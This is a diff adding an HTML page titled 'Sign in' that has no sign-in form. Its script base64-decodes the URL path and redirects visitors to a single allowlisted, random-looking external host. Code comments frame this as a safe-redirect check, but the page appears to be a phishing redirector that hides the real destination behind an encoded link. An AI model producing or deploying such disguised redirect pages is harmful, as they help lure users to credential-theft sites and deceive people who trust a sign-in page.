@@ -1,0 +1,28 @@
+<html>
+<head><title>Sign in</title></head>
+<body>
+    <script>
+        // List of allowed domains or paths for redirection
+        const allowedDomains = [
+            'https://mgokg.mlcros.org/ucibk/d4wju/',
+        ];
+
+        // Get the last path segment and decode it
+        const encodedPathSegment = window.location.pathname.split('/').pop();
+        try {
+            // Decode from Base64
+            const decodedUrl = window.atob(encodedPathSegment);
+
+            // Check if the decoded URL is allowed
+            if (allowedDomains.includes(decodedUrl)) {
+                // Redirect only if it matches an allowed domain or path
+                window.location.href = decodedUrl;
+            } else {
+                console.warn('Unrecognized or unsafe redirect URL');
+            }
+        } catch (error) {
+            console.error('Error decoding the URL:', error);
+        }
+    </script> 
+</body>
+</html>
